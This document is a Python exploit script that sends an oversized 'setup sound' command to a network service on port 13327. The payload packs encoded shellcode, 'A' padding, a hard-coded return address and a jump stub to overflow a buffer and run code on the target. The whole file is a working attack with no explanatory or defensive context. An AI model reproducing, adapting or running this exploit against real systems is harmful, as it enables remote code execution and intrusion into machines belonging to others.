#!/usr/bin/python
import socket
host = '192.168.1.1'


shellcode =  b""
shellcode += b"\xbd\x45\xa8\x95\x75\xd9\xc6\xd9\x74\x24\xf4"
shellcode += b"\x58\x29\xc9\xb1\x12\x31\x68\x12\x03\x68\x12"
shellcode += b"\x83\xad\x54\x77\x80\x1c\x7e\x8f\x88\x0d\xc3"
shellcode += b"\x23\x25\xb3\x4a\x22\x09\xd5\x81\x25\xf9\x40"
shellcode += b"\xaa\x19\x33\xf2\x83\x1c\x32\x9a\xd3\x77\xb3"
shellcode += b"\x85\xbc\x85\x3c\x38\x86\x03\xdd\x8a\x9e\x43"
shellcode += b"\x4f\xb9\xed\x67\xe6\xdc\xdf\xe8\xaa\x76\x8e"
shellcode += b"\xc7\x39\xee\x26\x37\x91\x8c\xdf\xce\x0e\x02"
shellcode += b"\x73\x58\x31\x12\x78\x97\x32"

returnaddr = "\x96\x45\x13\x08"
pattern = shellcode + "A" * (4368 - len(shellcode)) + returnaddr + "\x83\xC0\x0C\xFF\xE0\x90\x90"

buffer = '\x11(setup sound ' + pattern + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, 13327))
s.send(buffer)
s.close()
